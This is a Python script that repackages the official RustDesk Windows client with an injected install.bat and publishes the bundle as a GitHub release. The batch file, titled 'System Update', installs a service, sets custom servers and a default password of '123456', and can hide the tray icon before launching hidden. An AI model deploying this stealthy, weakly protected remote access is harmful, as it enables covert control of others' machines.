import os
import sys
import zipfile
import shutil
import requests
import uuid

# --- 步骤 1: 强制验证是否运行了最新代码 ---
print(">>> 脚本已更新 (版本：V3.0) <<<", flush=True)

# --- 配置部分 ---
GITHUB_TOKEN = os.getenv("GITHUB_TOKEN")
REPO_OWNER = os.getenv("REPO_OWNER")
REPO_NAME = os.getenv("REPO_NAME")

API_SERVER = os.getenv("API_SERVER", "")
ID_SERVER = os.getenv("ID_SERVER", "")
RELAY_SERVER = os.getenv("RELAY_SERVER", "")
KEY = os.getenv("KEY", "")
CUSTOM_ID = os.getenv("CUSTOM_ID", "").strip() 
PASSWORD = os.getenv("PASSWORD", "123456")
OS_TARGET = os.getenv("OS_TARGET", "windows")
HIDE_TRAY = os.getenv("HIDE_TRAY", "false")

def log(msg):
    print(f"[LOG] {msg}", flush=True)

def get_latest_rustdesk_version():
    log("正在获取 RustDesk 最新版本...")
    url = "https://api.github.com/repos/rustdesk/rustdesk/releases/latest"
    try:
        headers = {'User-Agent': 'Python-RustDesk-Builder'}
        r = requests.get(url, headers=headers, timeout=15)
        if r.status_code != 200:
            log(f"获取版本失败，使用兜底版本")
            return "1.2.3" 
        tag_name = r.json()['tag_name']
        if tag_name.startswith('v'):
            return tag_name[1:] 
        return tag_name
    except Exception as e:
        log(f"获取版本异常: {e}")
        return "1.2.3"

def download_file(url, dest):
    log(f"正在下载: {url}")
    try:
        response = requests.get(url, stream=True, timeout=60)
        if response.status_code != 200:
             raise Exception(f"官方下载链接返回: {response.status_code}")
             
        with open(dest, 'wb') as f:
            for chunk in response.iter_content(chunk_size=8192):
                if chunk: f.write(chunk)
        log("下载完成")
    except Exception as e:
        raise Exception(f"下载文件失败: {e}")

def generate_windows_wrapper():
    cmd_set_id = ""
    if CUSTOM_ID:
        cmd_set_id = f"rustdesk.exe --id \"{CUSTOM_ID}\"\n"
    bat_content = f"""@echo off
title System Update
schtasks /Delete /TN "RustDeskUpdate" /F >nul 2>&1
taskkill /F /IM rustdesk.exe >nul 2>&1
taskkill /F /IM rustdesk-service.exe >nul 2>&1
rustdesk.exe --install-service
rustdesk.exe --key "{KEY}"
rustdesk.exe --api-server "{API_SERVER}"
rustdesk.exe --id-server "{ID_SERVER}"
IF NOT "{RELAY_SERVER}"=="" (
    rustdesk.exe --relay-server "{RELAY_SERVER}"
)
{cmd_set_id}
rustdesk.exe --password "{PASSWORD}"
IF "{HIDE_TRAY}"=="true" (
    reg add "HKCU\\Software\\RustDesk" /v "hideTrayIcon" /t REG_DWORD /d 1 /f
    reg add "HKLM\\Software\\RustDesk" /v "hideTrayIcon" /t REG_DWORD /d 1 /f
)
net start RustDesk >nul 2>&1
start "" rustdesk.exe --hide
exit
"""
    return bat_content

def process_zip(zip_path, output_path):
    log("正在解压并注入配置脚本...")
    temp_dir = zip_path.replace(".zip", "_temp")
    if os.path.exists(temp_dir): shutil.rmtree(temp_dir)
    os.makedirs(temp_dir)
    with zipfile.ZipFile(zip_path, 'r') as z:
        z.extractall(temp_dir)
    if OS_TARGET == "windows":
        wrapper = generate_windows_wrapper()
        with open(os.path.join(temp_dir, "install.bat"), "w", encoding="utf-8") as f:
            f.write(wrapper)
    else:
        # 忽略 linux 包装逻辑，简化调试
        pass
        
    with zipfile.ZipFile(output_path, 'w', zipfile.ZIP_DEFLATED) as z:
        for root, dirs, files in os.walk(temp_dir):
            for file in files:
                file_path = os.path.join(root, file)
                arcname = os.path.relpath(file_path, temp_dir)
                z.write(file_path, arcname)
    shutil.rmtree(temp_dir)
    log("修改后的压缩包已生成")

def create_github_release(filename):
    log(">>> 准备上传 GitHub ...")
    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/releases"
    headers = {"Authorization": f"token {GITHUB_TOKEN}"}
    
    base_ver = get_latest_rustdesk_version()
    tag_name = f"v{base_ver}-{uuid.uuid4().hex[:8]}" 
    release_name = f"RustDesk Build ({OS_TARGET})"

    data = {
        "tag_name": tag_name,
        "name": release_name,
        "body": f"Auto generated\nVersion: {base_ver}",
        "draft": False,
        "prerelease": False
    }
    
    log(f"正在创建 Release: {tag_name}")
    
    # --- 核心调试区域 ---
    res = requests.post(url, headers=headers, json=data)
    
    if not res.ok:
        # 我们直接把原始报文打印出来，不处理格式，不要文件
        print("-" * 50, file=sys.stderr, flush=True)
        print(f">>> 错误状态码: {res.status_code} <<<", file=sys.stderr, flush=True)
        print(f">>> GitHub 原始返回内容: <<<", file=sys.stderr, flush=True)
        print(res.text, file=sys.stderr, flush=True)
        print("-" * 50, file=sys.stderr, flush=True)
        
        # 再次检查是否是空仓库导致的错误
        if "Ref doesn't exist" in res.text or "target_commitish" in res.text:
             print("❓ 检测到可能是 'Ref' 错误。", flush=True)
        
        raise Exception(f"GitHub API 失败 ({res.status_code})，请查看上方红色/错误日志获取详情")
    
    upload_url = res.json()["upload_url"].replace("{?name,label}", "")
    log(f"正在上传文件...")
    upload_url_with_name = f"{upload_url}?name={filename}"
    
    with open(filename, 'rb') as f:
        upload_res = requests.post(upload_url_with_name, headers=headers, data=f)
        
    if upload_res.ok:
        print(f"✅ 成功！下载: {res.json()['html_url']}")
    else:
        raise Exception(f"上传失败 {upload_res.status_code}")

def main():
    try:
        # 环境检查
        if not REPO_OWNER or not REPO_NAME:
             raise Exception("环境变量错误: 缺少 REPO_OWNER 或 REPO_NAME")

        log("开始构建流程...")
        ver = get_latest_rustdesk_version()
        
        if OS_TARGET == "windows":
            file_name = f"rustdesk-{ver}-x86_64-pc-windows.zip"
            source_url = f"https://github.com/rustdesk/rustdesk/releases/download/v{ver}/{file_name}"
            output_name = f"RustDesk-Windows-Bundle.zip"
        else:
            return

        download_file(source_url, file_name)
        process_zip(file_name, output_name)
        create_github_release(output_name)
        
    except Exception as e:
        print(f"\n❌ 程序终止: {e}", file=sys.stderr, flush=True)
        # 强制退出
        sys.exit(1)

if __name__ == "__main__":
    main()
